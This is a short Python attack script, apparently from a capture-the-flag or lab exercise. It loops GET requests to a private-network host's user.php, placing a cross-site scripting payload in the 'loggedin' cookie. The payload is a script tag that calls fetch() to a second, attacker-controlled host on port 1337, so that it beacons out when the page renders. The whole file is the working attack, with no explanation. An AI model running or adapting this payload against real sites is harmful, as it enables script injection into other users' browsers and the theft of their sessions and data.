import requests
import time

url = "http://10.10.67.238:8000/user.php"
cookie_value = "<script>setTimeout(() => fetch('http://10.17.37.98:1337/'), 2000)</script>"
cookies = {
    "loggedin": cookie_value
}

while True:
    try:
        response = requests.get(url, cookies=cookies)
        print(f"[+] Sent payload. Status: {response.status_code}")
        print(f"[+] Response body: {response.text}")
    except Exception as e:
        print(f"[-] Error: {e}")

    time.sleep(1)
